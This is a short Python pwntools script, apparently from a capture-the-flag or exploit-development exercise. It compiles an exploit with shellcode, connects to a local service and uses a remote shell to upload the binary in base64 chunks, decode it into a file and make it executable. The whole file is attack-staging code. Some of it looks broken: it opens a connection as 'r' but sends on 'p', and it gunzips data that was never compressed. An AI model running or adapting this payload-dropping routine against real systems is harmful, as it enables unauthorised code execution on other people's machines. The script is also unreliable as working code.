from pwn import *
from os import system

r=remote("localhost",9012)

def send_exploit(compressed_elf):
    CHUNK_SZ = 256
    for i in range(0, len(compressed_elf), CHUNK_SZ):
        chunk = compressed_elf[i: min(i + CHUNK_SZ, len(compressed_elf))]
        chunk = base64.b64encode(chunk)
        cmd = "echo %s | base64 -d  >> /home/user/exp.gz" % chunk.decode()
        p.sendline(cmd)
    p.sendline("cat /home/user/exp.gz | gzip -d > /home/user/exp")
    p.sendline("chmod +x /home/user/exp")


system("gcc exploit.c shellcode.S -no-pie -nostdlib -fomit-frame-pointer -o exp")
with open("exp", "rb") as f:
	send_exploit(f.read())